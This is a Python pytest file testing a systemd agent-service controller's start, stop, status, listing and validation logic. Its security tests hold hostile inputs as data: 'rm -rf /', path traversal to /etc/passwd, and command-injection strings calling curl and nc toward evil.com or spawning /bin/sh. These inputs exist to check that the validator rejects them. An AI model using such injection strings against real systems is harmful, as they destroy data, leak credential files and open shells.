"""
Unit tests for SystemdAgentController
Tests systemd integration and service management functionality.
"""

import pytest
import asyncio
from unittest.mock import AsyncMock, patch, MagicMock
import time

from src.agent_controller import (
    SystemdAgentController, 
    AgentControlError,
    ServiceNotFoundError,
    ServiceOperationError,
    SecurityViolationError,
    ServiceState,
    AgentStatus,
    OperationResult
)


class TestSystemdAgentController:
    """Test systemd agent controller functionality."""

    @pytest.fixture
    def controller(self):
        """Create agent controller for testing."""
        return SystemdAgentController(
            allowed_services=['backend-architect', 'frontend-developer', 'test-writer-fixer'],
            service_prefix='test-agent-',
            operation_timeout=5
        )

    @pytest.mark.asyncio
    async def test_controller_initialization(self, controller):
        """Test controller initialization and validation."""
        with patch.object(controller, '_run_systemctl_command') as mock_systemctl:
            with patch.object(controller, '_verify_dbus_access') as mock_dbus:
                with patch.object(controller, '_discover_agent_services') as mock_discover:
                    mock_systemctl.return_value = OperationResult(
                        success=True,
                        message="systemd 245",
                        details={},
                        timestamp=time.time()
                    )
                    
                    await controller.initialize()
                    
                    mock_systemctl.assert_called_once_with(['--version'])
                    mock_dbus.assert_called_once()
                    mock_discover.assert_called_once()

    @pytest.mark.asyncio
    async def test_start_agent_success(self, controller):
        """Test successful agent start."""
        with patch.object(controller, '_get_service_status') as mock_status:
            with patch.object(controller, '_run_systemctl_command') as mock_systemctl:
                # Mock inactive status initially
                mock_status.return_value = AgentStatus(
                    name='test-agent-backend-architect.service',
                    state=ServiceState.INACTIVE,
                    sub_state='dead',
                    active_since=None,
                    memory_usage=None,
                    cpu_percent=None,
                    pid=None,
                    last_logs=[],
                    error_message=None
                )
                
                # Mock successful start command
                mock_systemctl.return_value = OperationResult(
                    success=True,
                    message="Started successfully",
                    details={},
                    timestamp=time.time()
                )
                
                # After start, mock active status
                mock_status.side_effect = [
                    mock_status.return_value,  # Initial status check
                    AgentStatus(  # Status after start
                        name='test-agent-backend-architect.service',
                        state=ServiceState.ACTIVE,
                        sub_state='running',
                        active_since='2024-01-01T12:00:00Z',
                        memory_usage=50000000,  # 50MB
                        cpu_percent=2.5,
                        pid=12345,
                        last_logs=['Started successfully'],
                        error_message=None
                    )
                ]
                
                result = await controller.start_agent('backend-architect')
                
                assert result['success'] is True
                assert 'started successfully' in result['message'].lower()
                assert result['details']['agent_type'] == 'backend-architect'
                assert result['details']['pid'] == 12345
                
                mock_systemctl.assert_called_once_with(['start', 'test-agent-backend-architect.service'])

    @pytest.mark.asyncio
    async def test_start_agent_already_active(self, controller):
        """Test starting an already active agent."""
        with patch.object(controller, '_get_service_status') as mock_status:
            mock_status.return_value = AgentStatus(
                name='test-agent-backend-architect.service',
                state=ServiceState.ACTIVE,
                sub_state='running',
                active_since='2024-01-01T12:00:00Z',
                memory_usage=50000000,
                cpu_percent=2.5,
                pid=12345,
                last_logs=[],
                error_message=None
            )
            
            result = await controller.start_agent('backend-architect')
            
            assert result['success'] is False
            assert 'already active' in result['message'].lower()

    @pytest.mark.asyncio
    async def test_start_agent_invalid_type(self, controller):
        """Test starting agent with invalid type."""
        result = await controller.start_agent('invalid-agent-type')
        
        assert result['success'] is False
        assert 'invalid agent type' in result['message'].lower()

    @pytest.mark.asyncio
    async def test_stop_agent_success(self, controller):
        """Test successful agent stop."""
        with patch.object(controller, '_get_service_status') as mock_status:
            with patch.object(controller, '_run_systemctl_command') as mock_systemctl:
                # Mock active status initially
                mock_status.return_value = AgentStatus(
                    name='test-agent-backend-architect.service',
                    state=ServiceState.ACTIVE,
                    sub_state='running',
                    active_since='2024-01-01T12:00:00Z',
                    memory_usage=50000000,
                    cpu_percent=2.5,
                    pid=12345,
                    last_logs=[],
                    error_message=None
                )
                
                # Mock successful stop command
                mock_systemctl.return_value = OperationResult(
                    success=True,
                    message="Stopped successfully",
                    details={},
                    timestamp=time.time()
                )
                
                # After stop, mock inactive status
                mock_status.side_effect = [
                    mock_status.return_value,  # Initial status check
                    AgentStatus(  # Status after stop
                        name='test-agent-backend-architect.service',
                        state=ServiceState.INACTIVE,
                        sub_state='dead',
                        active_since=None,
                        memory_usage=None,
                        cpu_percent=None,
                        pid=None,
                        last_logs=[],
                        error_message=None
                    )
                ]
                
                result = await controller.stop_agent('backend-architect')
                
                assert result['success'] is True
                assert 'stopped successfully' in result['message'].lower()
                
                mock_systemctl.assert_called_once_with(['stop', 'test-agent-backend-architect.service'])

    @pytest.mark.asyncio
    async def test_stop_agent_already_inactive(self, controller):
        """Test stopping an already inactive agent."""
        with patch.object(controller, '_get_service_status') as mock_status:
            mock_status.return_value = AgentStatus(
                name='test-agent-backend-architect.service',
                state=ServiceState.INACTIVE,
                sub_state='dead',
                active_since=None,
                memory_usage=None,
                cpu_percent=None,
                pid=None,
                last_logs=[],
                error_message=None
            )
            
            result = await controller.stop_agent('backend-architect')
            
            assert result['success'] is True
            assert 'already inactive' in result['message'].lower()

    @pytest.mark.asyncio
    async def test_get_status_active_agent(self, controller):
        """Test getting status of active agent."""
        with patch.object(controller, '_get_service_status') as mock_status:
            with patch.object(controller, '_get_service_metrics') as mock_metrics:
                mock_status.return_value = AgentStatus(
                    name='test-agent-backend-architect.service',
                    state=ServiceState.ACTIVE,
                    sub_state='running',
                    active_since='2024-01-01T12:00:00Z',
                    memory_usage=50000000,
                    cpu_percent=2.5,
                    pid=12345,
                    last_logs=['Service started successfully'],
                    error_message=None
                )
                
                mock_metrics.return_value = {
                    'cpu_percent': 2.5,
                    'memory_percent': 1.2,
                    'memory_usage': 50000000
                }
                
                result = await controller.get_status('backend-architect')
                
                assert result['success'] is True
                assert result['details']['state'] == 'active'
                assert result['details']['pid'] == 12345
                assert result['details']['memory_usage'] == 50000000
                assert result['details']['cpu_percent'] == 2.5

    @pytest.mark.asyncio
    async def test_get_status_invalid_agent(self, controller):
        """Test getting status of invalid agent type."""
        result = await controller.get_status('invalid-agent-type')
        
        assert result['success'] is False
        assert 'invalid agent type' in result['message'].lower()

    @pytest.mark.asyncio
    async def test_list_agents(self, controller):
        """Test listing all agents."""
        with patch.object(controller, '_get_service_status') as mock_status:
            # Mock different agent states
            status_responses = [
                AgentStatus(  # backend-architect - active
                    name='test-agent-backend-architect.service',
                    state=ServiceState.ACTIVE,
                    sub_state='running',
                    active_since='2024-01-01T12:00:00Z',
                    memory_usage=50000000,
                    cpu_percent=2.5,
                    pid=12345,
                    last_logs=[],
                    error_message=None
                ),
                AgentStatus(  # frontend-developer - inactive
                    name='test-agent-frontend-developer.service',
                    state=ServiceState.INACTIVE,
                    sub_state='dead',
                    active_since=None,
                    memory_usage=None,
                    cpu_percent=None,
                    pid=None,
                    last_logs=[],
                    error_message=None
                ),
                AgentStatus(  # test-writer-fixer - failed
                    name='test-agent-test-writer-fixer.service',
                    state=ServiceState.FAILED,
                    sub_state='failed',
                    active_since=None,
                    memory_usage=None,
                    cpu_percent=None,
                    pid=None,
                    last_logs=[],
                    error_message='Service crashed'
                )
            ]
            
            mock_status.side_effect = status_responses
            
            result = await controller.list_agents()
            
            assert result['success'] is True
            assert len(result['details']['agents']) == 3
            assert result['details']['summary']['total'] == 3
            assert result['details']['summary']['active'] == 1
            assert result['details']['summary']['inactive'] == 1
            assert result['details']['summary']['failed'] == 1

    @pytest.mark.asyncio
    async def test_list_agents_with_filter(self, controller):
        """Test listing agents with state filter."""
        with patch.object(controller, '_get_service_status') as mock_status:
            mock_status.return_value = AgentStatus(
                name='test-agent-backend-architect.service',
                state=ServiceState.ACTIVE,
                sub_state='running',
                active_since='2024-01-01T12:00:00Z',
                memory_usage=50000000,
                cpu_percent=2.5,
                pid=12345,
                last_logs=[],
                error_message=None
            )
            
            # Mock only one agent for simplicity
            controller.allowed_services = {'backend-architect'}
            
            result = await controller.list_agents(filter_state='active')
            
            assert result['success'] is True
            assert len(result['details']['agents']) == 1
            assert result['details']['agents'][0]['state'] == 'active'

    @pytest.mark.asyncio
    async def test_concurrent_operations_limit(self, controller):
        """Test concurrent operations limit enforcement."""
        controller.max_concurrent_operations = 2
        
        # Fill up active operations
        controller._active_operations.add('op1')
        controller._active_operations.add('op2')
        
        result = await controller.start_agent('backend-architect')
        
        assert result['success'] is False
        assert 'too many concurrent operations' in result['message'].lower()

    @pytest.mark.asyncio
    async def test_command_execution_security(self, controller):
        """Test command execution security controls."""
        with patch('asyncio.create_subprocess_exec') as mock_exec:
            # Test that only allowed commands are executed
            await controller._run_command(['systemctl', 'status', 'test.service'])
            mock_exec.assert_called_once()
            
            # Test that disallowed commands are rejected
            result = await controller._run_command(['rm', '-rf', '/'])
            assert result.success is False
            assert 'command not allowed' in result.message.lower()

    @pytest.mark.asyncio
    async def test_command_timeout_handling(self, controller):
        """Test command timeout handling."""
        with patch('asyncio.create_subprocess_exec') as mock_exec:
            # Mock process that times out
            process = AsyncMock()
            process.communicate.side_effect = asyncio.TimeoutError()
            process.kill = MagicMock()
            process.wait = AsyncMock()
            mock_exec.return_value = process
            
            result = await controller._run_command(['systemctl', 'start', 'test.service'], timeout=1)
            
            assert result.success is False
            assert 'timed out' in result.message.lower()
            process.kill.assert_called_once()

    @pytest.mark.asyncio
    async def test_service_metrics_collection(self, controller):
        """Test service resource metrics collection."""
        with patch.object(controller, '_run_command') as mock_run:
            mock_run.return_value = OperationResult(
                success=True,
                message="12345  2.5  1.2 50000",  # pid cpu_percent mem_percent rss_kb
                details={},
                timestamp=time.time()
            )
            
            metrics = await controller._get_service_metrics(12345)
            
            assert metrics['cpu_percent'] == 2.5
            assert metrics['memory_percent'] == 1.2
            assert metrics['memory_usage'] == 50000 * 1024  # Converted to bytes

    @pytest.mark.asyncio
    async def test_service_logs_collection(self, controller):
        """Test service logs collection."""
        with patch.object(controller, '_run_command') as mock_run:
            mock_run.return_value = OperationResult(
                success=True,
                message="Jan 01 12:00:01 host systemd[1]: Started test service\nJan 01 12:00:02 host test[12345]: Service running",
                details={},
                timestamp=time.time()
            )
            
            logs = await controller._get_service_logs('test-service')
            
            assert len(logs) == 2
            assert 'Started test service' in logs[0]
            assert 'Service running' in logs[1]

    def test_service_name_generation(self, controller):
        """Test service name generation."""
        service_name = controller._get_service_name('backend-architect')
        assert service_name == 'test-agent-backend-architect.service'

    def test_agent_type_validation(self, controller):
        """Test agent type validation logic."""
        # Valid agent types
        assert controller._is_valid_agent_type('backend-architect') is True
        assert controller._is_valid_agent_type('frontend-developer') is True
        
        # Invalid agent types
        assert controller._is_valid_agent_type('invalid-agent') is False
        assert controller._is_valid_agent_type('backend/architect') is False  # Contains /
        assert controller._is_valid_agent_type('backend;architect') is False  # Contains ;
        assert controller._is_valid_agent_type('') is False  # Empty
        assert controller._is_valid_agent_type('a' * 100) is False  # Too long

    def test_systemd_state_mapping(self, controller):
        """Test systemd state to ServiceState mapping."""
        assert controller._map_systemd_state('active') == ServiceState.ACTIVE
        assert controller._map_systemd_state('inactive') == ServiceState.INACTIVE
        assert controller._map_systemd_state('failed') == ServiceState.FAILED
        assert controller._map_systemd_state('activating') == ServiceState.ACTIVATING
        assert controller._map_systemd_state('deactivating') == ServiceState.DEACTIVATING
        assert controller._map_systemd_state('unknown') == ServiceState.UNKNOWN

    @pytest.mark.asyncio
    async def test_operation_history_tracking(self, controller):
        """Test operation history tracking."""
        with patch.object(controller, '_get_service_status') as mock_status:
            with patch.object(controller, '_run_systemctl_command') as mock_systemctl:
                mock_status.return_value = AgentStatus(
                    name='test-agent-backend-architect.service',
                    state=ServiceState.INACTIVE,
                    sub_state='dead',
                    active_since=None,
                    memory_usage=None,
                    cpu_percent=None,
                    pid=None,
                    last_logs=[],
                    error_message=None
                )
                
                mock_systemctl.return_value = OperationResult(
                    success=True,
                    message="Started successfully",
                    details={},
                    timestamp=time.time()
                )
                
                await controller.start_agent('backend-architect')
                
                history = controller.get_operation_history()
                assert len(history) == 1
                assert history[0]['operation'] == 'start'
                assert history[0]['agent_type'] == 'backend-architect'
                assert history[0]['success'] is True

    def test_controller_statistics(self, controller):
        """Test controller statistics collection."""
        stats = controller.get_controller_stats()
        
        assert 'allowed_services' in stats
        assert 'service_prefix' in stats
        assert 'operation_timeout' in stats
        assert 'active_operations' in stats
        assert 'max_concurrent_operations' in stats
        assert stats['service_prefix'] == 'test-agent-'
        assert stats['operation_timeout'] == 5

    @pytest.mark.asyncio
    async def test_secure_environment_variables(self, controller):
        """Test secure environment variable handling."""
        env = controller._get_secure_environment()
        
        # Should have minimal environment
        assert 'PATH' in env
        assert 'LANG' in env
        assert 'LC_ALL' in env
        
        # Should not have potentially dangerous variables
        assert 'HOME' not in env
        assert 'USER' not in env
        assert 'SHELL' not in env
        
        # PATH should be restricted to safe directories
        assert env['PATH'] == '/usr/bin:/bin:/usr/sbin:/sbin'

    @pytest.mark.asyncio
    async def test_dbus_access_verification(self, controller):
        """Test D-Bus access verification."""
        with patch.object(controller, '_run_systemctl_command') as mock_systemctl:
            # Test successful D-Bus access
            mock_systemctl.return_value = OperationResult(
                success=True,
                message="UNIT           LOAD   ACTIVE SUB     DESCRIPTION\ntest.service   loaded active running Test service",
                details={},
                timestamp=time.time()
            )
            
            await controller._verify_dbus_access()  # Should not raise
            
            # Test failed D-Bus access
            mock_systemctl.return_value = OperationResult(
                success=False,
                message="Failed to connect to bus",
                details={},
                timestamp=time.time()
            )
            
            with pytest.raises(AgentControlError):
                await controller._verify_dbus_access()

    @pytest.mark.asyncio
    async def test_service_discovery(self, controller):
        """Test agent service discovery."""
        with patch.object(controller, '_run_systemctl_command') as mock_systemctl:
            mock_systemctl.return_value = OperationResult(
                success=True,
                message="""UNIT                                    LOAD   ACTIVE SUB     DESCRIPTION
test-agent-backend-architect.service   loaded active running Backend Architect Agent
test-agent-frontend-developer.service  loaded inactive dead   Frontend Developer Agent  
other-service.service                   loaded active running Other Service
""",
                details={},
                timestamp=time.time()
            )
            
            await controller._discover_agent_services()
            
            # Should have called systemctl list-units with appropriate filter
            mock_systemctl.assert_called_once_with([
                'list-units', '--type=service', 'test-agent-*', '--all'
            ])

    @pytest.mark.asyncio
    async def test_error_handling_in_operations(self, controller):
        """Test error handling in various operations."""
        # Test start_agent with systemctl failure
        with patch.object(controller, '_get_service_status') as mock_status:
            with patch.object(controller, '_run_systemctl_command') as mock_systemctl:
                mock_status.return_value = AgentStatus(
                    name='test-agent-backend-architect.service',
                    state=ServiceState.INACTIVE,
                    sub_state='dead',
                    active_since=None,
                    memory_usage=None,
                    cpu_percent=None,
                    pid=None,
                    last_logs=[],
                    error_message=None
                )
                
                mock_systemctl.return_value = OperationResult(
                    success=False,
                    message="Unit not found",
                    details={},
                    timestamp=time.time()
                )
                
                result = await controller.start_agent('backend-architect')
                
                assert result['success'] is False
                assert 'failed to start' in result['message'].lower()

    @pytest.mark.asyncio
    async def test_agent_type_security_validation(self, controller):
        """Test security validation of agent type names."""
        dangerous_names = [
            '../../../etc/passwd',
            'agent; rm -rf /',
            'agent`whoami`',
            'agent$(cat /etc/passwd)',
            'agent && curl evil.com',
            'agent|nc evil.com 9999',
            'agent\\x00root',
            'agent\r\n/bin/sh'
        ]
        
        for dangerous_name in dangerous_names:
            assert controller._is_valid_agent_type(dangerous_name) is False, f"Should reject dangerous name: {dangerous_name}"